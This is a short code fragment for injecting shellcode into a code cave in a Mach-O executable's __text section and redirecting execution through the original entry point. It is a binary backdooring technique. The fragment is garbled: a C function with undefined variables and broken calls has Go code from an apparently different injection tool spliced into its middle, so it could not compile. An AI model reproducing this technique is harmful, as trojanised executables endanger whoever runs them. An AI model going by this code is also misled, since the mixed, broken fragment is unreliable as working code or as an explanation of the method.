int binject_MACH-O(char *file,char *shellcode)
{
   uint32_t size;
   FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
   size=ftell(f);
   char *file_buffer = calloc(1,size);
    for(i=0;i<sections;i++)
  {
       x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
                        if(x!=0)
                        break;
                       for _, section := range machoFile.Sections {
		if section.SectionHeader.Seg == "__TEXT" && section.Name == "__text" {
			caveOffset := 0x20 /* magic value */ + machoFile.FileHeader.Cmdsz
			log.Printf("Code Cave Size: %x - %x = %x\n", section.Offset, caveOffset, section.Offset-caveOffset)
			//
			// END CODE CAVE DETECTION SECTION
			//

			shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
			machoFile.Insertion = shellcode
			break
		}
	}
 
  }
                        
  free(file_buffer);
}
